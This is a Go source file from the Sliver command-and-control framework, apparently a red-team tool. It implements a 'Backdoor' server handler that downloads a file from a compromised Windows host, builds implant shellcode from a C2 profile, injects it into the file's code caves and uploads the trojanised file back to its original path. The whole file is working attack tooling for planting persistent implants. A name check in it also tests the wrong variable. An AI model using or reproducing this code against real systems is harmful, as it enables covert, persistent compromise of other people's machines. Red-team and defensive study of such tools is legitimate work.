package rpc

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"os"

	"github.com/Binject/binjection/bj"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/server/codenames"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/db"
	"github.com/bishopfox/sliver/server/generate"
	"github.com/bishopfox/sliver/util"
	"github.com/bishopfox/sliver/util/encoders"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
)

// Backdoor - Inject a sliver payload in a file on the remote system
func (rpc *Server) Backdoor(ctx context.Context, req *clientpb.BackdoorReq) (*clientpb.Backdoor, error) {
	var (
		name string
		err  error
	)

	if req.Name == "" {
		name, err = codenames.GetCodename()
		if err != nil {
			return nil, err
		}
	} else if err := util.AllowedName(name); err != nil {
		return nil, err
	} else {
		name = req.Name
	}

	resp := &clientpb.Backdoor{}
	session := core.Sessions.Get(req.Request.SessionID)
	if session.OS != "windows" {
		return nil, status.Error(codes.InvalidArgument, fmt.Sprintf("%s is currently not supported", session.OS))
	}
	download, err := rpc.Download(context.Background(), &sliverpb.DownloadReq{
		Request: &commonpb.Request{
			SessionID: session.ID,
			Timeout:   req.Request.Timeout,
		},
		Path: req.FilePath,
	})
	if err != nil {
		return nil, err
	}
	if download.Encoder == "gzip" {
		download.Data, err = new(encoders.Gzip).Decode(download.Data)
		if err != nil {
			return nil, err
		}
	}

	profiles, err := rpc.ImplantProfiles(context.Background(), &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	var p *clientpb.ImplantProfile
	for _, prof := range profiles.Profiles {
		if prof.Name == req.ProfileName {
			p = prof
		}
	}
	if p.GetName() == "" {
		return nil, fmt.Errorf("no profile found for name %s", req.ProfileName)
	}

	if p.Config.Format != clientpb.OutputFormat_SHELLCODE {
		return nil, fmt.Errorf("please select a profile targeting a shellcode format")
	}

	build, err := generate.GenerateConfig(name, p.Config)
	if err != nil {
		return nil, err
	}

	// retrieve http c2 implant config
	httpC2Config, err := db.LoadHTTPC2ConfigByName(p.Config.HTTPC2ConfigName)
	if err != nil {
		return nil, status.Error(codes.Internal, err.Error())
	}

	fPath, err := generate.SliverShellcode(name, build, p.Config, httpC2Config.ImplantConfig)
	if err != nil {
		return nil, status.Error(codes.Internal, err.Error())
	}
	shellcode, err := os.ReadFile(fPath)
	if err != nil {
		return nil, status.Error(codes.Internal, err.Error())
	}
	bjConfig := &bj.BinjectConfig{
		CodeCaveMode: true,
	}
	newFile, err := bj.Binject(download.Data, shellcode, bjConfig)
	if err != nil {
		return nil, status.Error(codes.Internal, err.Error())
	}
	uploadGzip, _ := new(encoders.Gzip).Encode(newFile)
	// upload to remote target
	upload, err := rpc.Upload(context.Background(), &sliverpb.UploadReq{
		Encoder: "gzip",
		Data:    uploadGzip,
		Path:    req.FilePath,
		Request: &commonpb.Request{
			SessionID: session.ID,
			Timeout:   req.Request.Timeout,
		},
	})
	if err != nil {
		return nil, err
	}

	if upload.Response != nil && upload.Response.Err != "" {
		return nil, fmt.Errorf(upload.Response.Err)
	}

	return resp, nil
}
